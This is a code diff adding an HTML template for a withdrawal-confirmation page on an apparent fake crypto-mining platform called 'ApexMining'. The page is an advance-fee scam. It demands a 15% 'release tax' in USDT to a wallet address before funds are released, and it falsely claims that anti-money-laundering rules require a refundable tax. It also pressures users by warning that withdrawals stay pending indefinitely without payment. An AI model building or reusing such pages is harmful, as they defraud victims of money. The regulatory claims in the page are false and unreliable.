@@ -1,0 +1,35 @@
+{% extends "base.html" %}{% block title %}Confirm Withdrawal — ApexMining{% endblock %}{% block content %}
+<section class="section"><div class="container narrow">
+<div class="kicker">Step 2 of 3</div>
+<h2 class="section-title">Confirm Your Withdrawal</h2>
+<p class="section-sub">To release your funds, a mandatory tax must be paid per AML compliance.</p>
+
+<div class="panel">
+<h2>Withdrawal Summary</h2>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:14px">
+<div><div style="color:var(--muted);font-size:12px;text-transform:uppercase">Amount Requested</div><div style="font-size:24px;font-weight:900;color:#fff">${{ "%.2f"|format(wd.amount) }}</div></div>
+<div><div style="color:var(--muted);font-size:12px;text-transform:uppercase">Release Tax (15%)</div><div style="font-size:24px;font-weight:900;color:var(--gold)">${{ "%.2f"|format(wd.tax) }}</div></div>
+</div>
+</div>
+
+<div class="panel">
+<h2>⚠️ Payment Required</h2>
+<p style="color:var(--muted);margin-bottom:14px">Send the tax amount in USDT (TRC20) to the address below. Your withdrawal will be released within 24 hours of confirmation.</p>
+<div class="addr">{{ addr }}</div>
+<div style="background:var(--bg2);padding:14px;border-radius:10px;margin-top:12px">
+<div style="color:var(--muted);font-size:13px">Exact amount to send:</div>
+<div style="font-size:22px;font-weight:900;color:var(--gold)">{{ "%.2f"|format(wd.tax) }} USDT</div>
+</div>
+<form method="post" action="/withdraw/confirm-tax" style="margin-top:20px">
+<div class="field"><label>Transaction Hash (TXID)</label><input name="txid" placeholder="Paste your TXID here" required></div>
+<button class="btn btn-primary btn-block btn-lg">I've Paid — Confirm Now</button>
+</form>
+<p style="color:var(--muted2);font-size:12px;margin-top:14px;text-align:center">Without payment, your withdrawal will remain pending indefinitely.</p>
+</div>
+
+<div class="panel">
+<h2>Why is there a tax?</h2>
+<p style="color:var(--muted);font-size:14px;line-height:1.8">In accordance with international anti-money-laundering (AML) regulations, all crypto withdrawals above $50 are subject to a refundable release tax. This is standard practice across regulated platforms. The tax will be refunded to your balance after 30 days.</p>
+</div>
+
+</div></section>{% endblock %}
